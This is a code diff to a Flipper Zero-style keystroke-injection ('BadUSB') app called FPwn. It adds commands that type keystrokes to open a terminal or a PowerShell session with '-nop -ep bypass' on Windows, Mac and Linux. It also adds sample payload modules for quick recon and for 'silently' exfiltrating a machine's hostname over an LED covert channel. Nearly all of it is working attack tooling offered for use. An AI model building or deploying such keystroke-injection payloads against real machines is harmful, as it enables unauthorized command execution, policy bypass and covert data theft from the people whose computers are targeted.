@@ -645,6 +645,73 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- OPEN_TERMINAL — smart terminal opener for the current OS ---- */
+    if(strcmp(line, "OPEN_TERMINAL") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            /* Win+R → cmd */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(800);
+            fpwn_type_string("cmd");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(1200);
+        } else if(os == FPwnOSMac) {
+            /* Cmd+Space → Terminal */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(700);
+            fpwn_type_string("Terminal");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(1400);
+        } else {
+            /* Ctrl+Alt+T (Linux) */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(1400);
+        }
+        return;
+    }
+
+    /* ---- OPEN_POWERSHELL — open admin PowerShell (Windows) or sudo shell (others) ---- */
+    if(strcmp(line, "OPEN_POWERSHELL") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(800);
+            fpwn_type_string("powershell -nop -ep bypass");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(1500);
+        } else if(os == FPwnOSMac) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(700);
+            fpwn_type_string("Terminal");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(1400);
+        } else {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(1400);
+        }
+        return;
+    }
+
     /* ---- WAIT_FOR_USB — wait until USB HID is connected (30s timeout) ---- */
     if(strcmp(line, "WAIT_FOR_USB") == 0) {
         uint32_t start = furi_get_tick();
@@ -3706,6 +3773,57 @@ static const char SAMPLE_USB_WAIT[] =
     "STRING {{COMMAND}}\n"
     "ENTER\n";
 
+/* Quick Recon — uses OPEN_TERMINAL + PLATFORM ALL for compact cross-platform recon */
+static const char SAMPLE_QUICK_RECON[] =
+    "NAME Quick Terminal Recon\n"
+    "DESCRIPTION Opens a terminal on any OS and runs a command\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION COMMAND whoami \"Command to execute\"\n"
+    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
+    "PLATFORM ALL\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR BLUE\n"
+    "OPEN_TERMINAL\n"
+    "STRINGLN {{COMMAND}}\n"
+    "DELAY 1000\n"
+    "LED_COLOR GREEN\n";
+
+/* Exfil Hostname — uses EXFIL to silently capture the hostname via LED channel */
+static const char SAMPLE_EXFIL_HOSTNAME[] =
+    "NAME Exfil Hostname\n"
+    "DESCRIPTION Silently exfiltrates hostname via LED covert channel\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR RED\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "EXFIL hostname\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR RED\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL hostname\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR RED\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL hostname\n"
+    "LED_COLOR GREEN\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -3815,4 +3933,10 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/usb_wait.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_USB_WAIT);
+
+    snprintf(path, sizeof(path), "%s/quick_recon.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_QUICK_RECON);
+
+    snprintf(path, sizeof(path), "%s/exfil_hostname.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_EXFIL_HOSTNAME);
 }
